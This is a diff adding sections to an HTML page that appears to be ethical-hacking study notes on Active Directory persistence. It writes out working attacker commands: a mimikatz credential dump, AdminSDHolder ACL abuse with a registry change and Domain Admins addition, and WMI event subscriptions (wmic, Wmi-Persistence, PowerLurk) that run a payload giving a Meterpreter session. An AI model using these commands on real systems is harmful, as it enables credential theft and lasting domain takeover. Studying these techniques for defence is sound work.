@@ -90,3 +90,47 @@ Methods:
   <ul>If an attacker can succesfully elevate privileges and obtain admin rights to execute code on a local machine, they can run the following command to retrieve the NTLM hashes of the AD system's password:</ul>
   <ul>mimikatz "privilege::debug" "sekurlsa::logonpasswords"</ul>
 </ol></p>
+
+        <h2>AdminSDHolder</h2>
+<p>AdminSDHolder is an Active Domain - component that protects user accounts and groups having high privileges against accidental modifications of security permissions. <br/>
+  The Security Descriptor Propagator (SDProp) process retrieves the Access Control List (ACL) of AdminSDHolder that contains the default permissions for the accounts and groups.<br/> 
+  These default permissions are compared with the permissions of the highly privileged accounts to identify modifications and then overwritten with those defined in the ACL. </p>
+    
+    <p>Attackers having admin privileges on a compromised domain can abuse the SDProp process to establish persistence. Attackers can add a user account to the ACL to gain "GenericALL" privileges, equivalent to the domain 
+      administrator. Changes are replicated every hour by SDProp so attackers can maintain persistence. 
+<ol>
+  <ul>Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName Mike -Verbose -Rights All</ul>
+  <ul>The SDProp process retrieves the ACL to check whether Mike has GenericAll permissions</ul>
+  <ul>Get-ObjectAcl -SamAccountName "Mike" -ResolveGUIDs</ul>
+  <ul>Additionally, the following command can be used to change the default time of SDProp to 3 min by modifying the registry:</ul>
+  <ul>REG ADD HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /V AdminSDProtectFrequency /T REG_DWORD /F /D 300</ul>
+  <ul>Add Mike to Domain Admins group:</ul>
+  <ul>net group "Domain Admins" Mike /add /domain</ul>
+  <ul>Check the accessibility of the DC:</ul>
+  <ul>dir \\10.10.1.22\c$</ul>
+</ol></p>
+
+            <h2>WMI Event Subscription</h2>
+<p>Attackers use Windows Management Instrumentation (WMI) event subscription to execute malicious content and maintain persistence on the target system.
+<ol>
+  <ul>wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="EthicalHacker", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="Select * FROM __InstanceModificationEvent WITHIN 60 
+    WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"</ul>
+  <ul>wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="EthicalHacker", Executableath="C:\Windows\System32\ethicalhacker.exe", CommandLineTemplate=
+  "C:\Windows\System32\ethicalhacker.exe"</ul>
+  <ul>wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"EthicalHacker\"", Consumer="CommandLineEventConsumer.Name=\"EthicalHacker\""</ul>
+  <ul>The malicious payload is automatically executed within 60s after every restart of the system and creates a Meterpreter session with the attacker</ul>
+</ol></p>
+    <p>Attackers also use <b>Wmi-Persistence</b>, a Powershell script, to perform WMI event subscription and acquire persistence. It triggers various actions such as Startup, Logon, Interval and Timed and allows attackers to execute 
+      various functions such as the installation, review and removal of the WMI events.
+      <ol>
+        <ul>Install-Persistence -Trigger Startup -Payload "c:\windows\system32\ethicalhacker.exe"</ul>
+        <ul>This creates a trigger Startup that executes the specified payload within 5 min after system reboot and establishes a Meterpreter session with the attacker</ul>
+      </ol>
+  </p><a target=_blank href=https://github.com/Sw4mpf0x/PowerLurk><b>PowerLurk</b></a> is a POSH toolset for building malicious WMI event subscriptions. This script can trigger the events such as InsertUSB, UserLogon, Timed, Interval and ProcessStart.
+    <ol>
+      <ul>Import-Module .\PowerLurk.ps1</ul>
+      <ul>Get-WmiEvent</ul>
+      <ul>Register-MaliciousWmiEvent -EventName LogonLog -PermanentCommand "ethicalhacker.exe" -Trigger UserLogon -Username any</ul>
+    </ol></p>
+
+    
